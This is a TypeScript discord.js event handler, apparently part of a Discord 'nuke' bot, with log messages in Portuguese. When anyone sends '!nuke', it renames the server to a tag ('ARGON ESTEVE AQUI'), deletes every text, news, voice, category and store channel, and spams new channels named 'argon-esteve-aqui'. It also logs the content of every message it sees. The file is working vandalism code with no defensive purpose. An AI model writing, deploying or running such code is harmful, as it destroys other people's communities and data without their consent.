import IEvent from '../Interfaces/IEvent';
import {Client, Message} from 'discord.js';

export const event: IEvent = {
    name: 'message',
    execute(client: Client, message: Message) {
        console.log(message.content);

        if (message.content === '!nuke') {
            const quantityChannelsOfGuild = message.guild.channels;

            message.guild.edit({
                name: 'ARGON ESTEVE AQUI'
            });

            quantityChannelsOfGuild.forEach((channel: any) => {
                const type = channel.type;
                const name = channel.name;

                switch (type) {
                    case "text":
                        channel.delete().then(() => {
                            console.log(`Canal de texto '${name}' deletado!`);
                        }).catch(() => {
                            console.error(`Não foi possível deletar o canal.`)
                        });
                        break;
                    case "news":
                        channel.delete().then(() => {
                            console.log(`Canal de notícias '${name}' deletado!`);
                        }).catch(() => {
                            console.error(`Não foi possível deletar o canal.`)
                        });
                        break;
                    case "voice":
                        channel.delete().then(() => {
                            console.log(`Canal de voz '${name}' deletado!`);
                        }).catch(() => {
                            console.error(`Não foi possível deletar o canal.`)
                        });
                        break;
                    case "category":
                        channel.delete().then(() => {
                            console.log(`Canal de categoria '${name}' deletada!`);
                        }).catch(() => {
                            console.error(`Não foi possível deletar o canal de categoria.`)
                        });
                        break;
                    case "store":
                        channel.delete().then(() => {
                            console.log(`Canal de loja '${name}' deletada!`);
                        }).catch(() => {
                            console.error(`Não foi possível deletar o canal de loja.`)
                        });
                        break;
                }
            });

            for (let i = 0; i <= 10; i++) {
                message.guild.createChannel('argon-esteve-aqui', { type: 'text' });
            }
        }
    }
}